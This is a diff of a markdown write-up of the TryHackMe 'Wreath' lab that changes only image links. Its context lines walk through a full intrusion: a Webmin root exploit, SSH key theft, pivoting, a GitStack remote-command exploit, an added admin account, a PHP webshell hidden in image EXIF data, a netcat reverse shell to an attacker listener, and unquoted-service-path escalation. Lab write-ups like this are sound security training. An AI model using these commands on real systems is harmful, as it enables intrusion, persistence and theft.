@@ -11,7 +11,7 @@ We start off with the usual nmap scan to discover running services:
 ```
 sudo nmap -sC -sV -O 10.200.87.200 -T 5 -p-
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/1.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/1.png">
 Altough nmap has difficulties trying to fingerprint the OS we can sprt that it's running CentOS by the info about the webservice on port 80.
 
 
@@ -23,27 +23,27 @@ After running the following command we will have a root shell on the host:
 ```
 sudo python3 CVE-2019-15107.py 10.200.87.200 
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/2.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/2.png">
 
 By typing ```shell``` we can create a netcat reverse shell. I first tried port 4447 but it seems to be blocked by the firewall. After changing it to 53 we get a reverse shell on the host.
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/3.png">
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/4.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/3.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/4.png">
 
 We find a ssh key in ```/root/.ssh/id_rsa``` so now we have ssh access as root which will ease the rest of the process.
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/5.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/5.png">
 
 # Network Enumeration
 From within our ssh shell we download a nmap binary to conduct a ping sweep from the host in an attempt to discover new hosts on the network.
 ```
 ./mystr0-nmap -sn 10.200.87.0/24 -oN scan-mystr0
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/6.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/6.png">
 
 We find two new hosts (```.100,.150```) and start a nmap scan on both of them. ```10.200.87.100``` returned only filtered ports so we'll start with the other one.
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/7.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/7.png">
 
 # Pivoting
 We can't access the webservice directly from our attacking machine. We'll have to create a tunneled proxy in order to make the host available to us. 
@@ -56,7 +56,7 @@ We can't access the webservice directly from our attacking machine. We'll have t
 >Note: We'll use the ```-x``` switch to exclude our compromised server from the subnet.
 
 # Compromising 10.200.87.150
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/8.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/8.png">
 We can now browse to the website and spot a few directories. We can't however access them because we are blocked by a login page. The main page shows a folder called gitstack which implicates that this is running on the host. As logging in with default credentials doesn't work we'll use searchsploit to look for any known exploits on that service.
 
 
@@ -65,10 +65,10 @@ We can now browse to the website and spot a few directories. We can't however ac
 With this exploit we can execute commands remotely. The nice thing is, is that it uploads the exploit to the git environment where we can alter the ```POST``` requests to get more information on the host.
 >Note: Change ```GET``` to ```POST``` and add the ```Content-Type```.
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/9.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/9.png">
 
 We try to ping our attacking machine from ```10.200.87.150``` to see if we can setup a reverse shell back to our attacking machine.
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/10.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/10.png">
 
 Ping requests timed out so we need to use another way. There are two options. One is to set up a relay on ```10.200.87.200``` to pass our traffic through that host. Another way is to use our ssh root shell on the host to setup a netcat listener and use that host for further penetration.
 
@@ -85,7 +85,7 @@ curl -X POST http://10.200.87.150/web/exploit.php -d "a=powershell.exe%20-c%20%2
 
 We now have a reverse netcat shell:
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/11.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/11.png">
 
 We add an user with administrator privileges and remote access. That way we have more persistent access to the host.
 ```
@@ -112,7 +112,7 @@ Invoke-Portscan -Hosts 10.200.87.0/24
 ```
 We can see multiple open ports:
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/12.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/12.png">
 
 We can't access the webserver directly so we'll use ```chisel``` to create a proxy. We download chisel to our host and add an exception in the firewall rules for the port that we will be using.
 
@@ -128,12 +128,12 @@ On attacking machine:
 ```
 
 After changing our proxy settings in FireProxy we can visit the page at ```http://10.200.87.100```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/13.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/13.png">
 
 After searching around on the host I find a repository for the website at ```C:\GitStack\repositories\Website.git```. We download the repository to see if there is anything usefull inside. We find a reference to ```/resources``` as a file upload page.
 We can login using earlier found credentials: ```Thomas:i<3ruby```
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/14.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/14.png">
 
 We land on a page where we can upload images. We can try to upload a malicious image file to run commands on the host. After trying uploading various filetypes we learn that we can upload ```filename.jpeg.php``` files. There is however a check to see if the file is really an image so we'll have to use a real image, add php code to it's command, upload the file and hopefully are able to run commands.
 
@@ -155,7 +155,7 @@ exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){
 ```
 Upon browsing to the uploaded script we see that we can now run commands on the host:
 
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/15.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/15.png">
 
 We can now download netcat to our host to setup a reverse shell: 
 ```
@@ -166,26 +166,26 @@ With a netcat listener ready on port 443 on our attacking machine we run the fol
 ```
 powershell.exe c:\\windows\\temp\\nc-mystr0.exe 10.50.88.185 443 -e cmd.exe
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/16.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/16.png">
 
 # Privilege Escalation on 10.200.87.100
 Let's search for non-default services:
 ```
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/17.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/17.png">
 
 We spot a service with a space in it's path that doesn't have quotation marks around it which means it might be vulnerable to unquoted service path attack. We'll check to see if the service is running as the local system account:
 ```
 sc qc SystemExplorerHelpService
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/18.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/18.png">
 
 Now let's see if we have write permissions on the first half of the path. This will enable us to place our own file and run it as local system user.
 ```
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/19.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Wreath/assets/19.png">
 
 -- To be continued --
 
